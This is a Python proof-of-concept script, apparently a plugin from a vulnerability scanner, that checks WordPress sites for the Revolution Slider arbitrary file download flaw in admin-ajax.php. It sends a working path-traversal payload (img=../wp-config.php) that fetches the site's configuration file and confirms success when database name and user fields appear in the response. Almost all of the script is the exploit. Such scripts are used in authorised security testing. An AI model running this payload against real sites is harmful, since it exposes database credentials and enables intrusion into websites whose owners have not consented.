#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: wordpress admin-ajax.php任意文件下载
referer: unknown
author: Lucifer
description: 文件admin-ajax.php中,参数img存在任意文件下载漏洞。
'''
import sys
import requests
import warnings
def run(url):
        result = ['wordpress admin-ajax.php任意文件下载','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payload = "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"DB_NAME" in req.text and r"DB_USER" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
